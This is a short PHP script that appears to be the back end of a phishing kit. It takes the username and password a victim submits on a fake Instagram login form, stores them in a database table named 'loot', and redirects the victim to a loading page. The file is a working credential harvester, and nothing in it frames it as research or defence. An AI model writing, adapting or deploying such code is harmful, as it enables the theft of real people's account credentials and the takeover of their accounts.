<?php
// Database connection parameters
$servername = "127.0.0.1";
$username = "dpuser";
$password = "DPDBPASSWORD";
$dbname = "DPPortal";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get form data
$user = $_POST['username'];
$pass = $_POST['password'];
$service = "Instagram";
$timestamp = date('Y-m-d H:i:s');

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO loot (username, password, service, datetimestamp) VALUES (?, ?, ?, ?)");
$stmt->bind_param("ssss", $user, $pass, $service, $timestamp);

// Execute the query
if ($stmt->execute()) {
    // Close connections
    $stmt->close();
    $conn->close();
    
    // Redirect to BBC
    header("Location: loadingpage.html");
    exit();
} else {
    echo "Error: " . $stmt->error;
}

// Close connections
$stmt->close();
$conn->close();
?>
